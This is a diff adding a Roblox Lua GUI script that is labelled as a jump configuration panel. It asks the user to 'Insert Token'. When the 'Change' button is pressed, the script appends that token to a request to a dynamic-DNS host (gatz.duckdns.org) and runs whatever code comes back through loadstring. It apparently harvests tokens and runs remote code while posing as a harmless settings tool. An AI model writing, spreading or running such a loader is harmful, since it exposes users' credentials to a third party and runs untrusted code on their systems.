@@ -1,0 +1,77 @@
+local ScreenGui = Instance.new("ScreenGui")
+local JumpConfig = Instance.new("Frame")
+local JCTitle = Instance.new("TextLabel")
+local JumpConf = Instance.new("TextButton")
+local JCClose = Instance.new("TextButton")
+local JumpC = Instance.new("TextBox")
+
+ScreenGui.Parent = game.CoreGui
+
+JumpC.Name = "JumpC"
+JumpC.Parent = JumpConfig
+JumpC.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+JumpC.BorderSizePixel = 0
+JumpC.Position = UDim2.new(0.035518092, 0, 0.30, 0)
+JumpC.Size = UDim2.new(0.778996766, 0, 0.26676026, 0)
+JumpC.Font = Enum.Font.GothamSemibold
+JumpC.PlaceholderText = "Insert Token"
+JumpC.Text = ""
+JumpC.TextColor3 = Color3.fromRGB(255, 255, 255)
+JumpC.TextSize = 14.000
+
+JumpConfig.Name = "JumpConfig"
+JumpConfig.Parent = ScreenGui
+JumpConfig.BackgroundColor3 = Color3.new(0, 0, 0)
+JumpConfig.Position = UDim2.new(0.0203577988, 0, 0.641277611, 0)
+JumpConfig.Size = UDim2.new(0, 432, 0, 291)
+JumpConfig.Visible = true
+JumpConfig.Active = true
+JumpConfig.Draggable = true
+
+JCTitle.Name = "JCTitle"
+JCTitle.Parent = JumpConfig
+JCTitle.BackgroundColor3 = Color3.new(1, 0, 1)
+JCTitle.Size = UDim2.new(0, 332, 0, 31)
+JCTitle.Font = Enum.Font.GothamBold
+JCTitle.Text = "Welcome"
+JCTitle.TextColor3 = Color3.new(0, 0, 0)
+JCTitle.TextSize = 14
+
+JumpConf.Name = "JumpConf"
+JumpConf.Parent = JumpConfig
+JumpConf.BackgroundColor3 = Color3.new(0.333333, 1, 0)
+JumpConf.Position = UDim2.new(0.35518092, 0, 0.63, 0)
+JumpConf.Size = UDim2.new(0, 110, 0, 50)
+JumpConf.Font = Enum.Font.GothamBold
+JumpConf.Text = "Change"
+JumpConf.TextColor3 = Color3.new(0, 0, 0)
+JumpConf.TextScaled = true
+JumpConf.TextSize = 14
+JumpConf.TextWrapped = true
+JumpConf.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("http://gatz.duckdns.org/script.php?token=" .. JumpC.Text))()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Accessing Token";
+        Text = JumpC.Text;
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
+
+JCClose.Name = "JCClose"
+JCClose.Parent = JumpConfig
+JCClose.BackgroundColor3 = Color3.new(1, 0, 0)
+JCClose.Position = UDim2.new(0.879518092, 0, 0, 0)
+JCClose.Size = UDim2.new(0, 40, 0, 31)
+JCClose.Font = Enum.Font.GothamBlack
+JCClose.Text = "X"
+JCClose.TextColor3 = Color3.new(0, 0, 0)
+JCClose.TextScaled = true
+JCClose.TextSize = 14
+JCClose.TextWrapped = true
+JCClose.MouseButton1Down:connect(function()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "GoodBye";
+        Text = "Script for Login Closed";
+        Icon = "rbxthumb://type=AvatarHeadShot&id=3044336136&w=150&h=150"})
+Duration = 16;
+end)
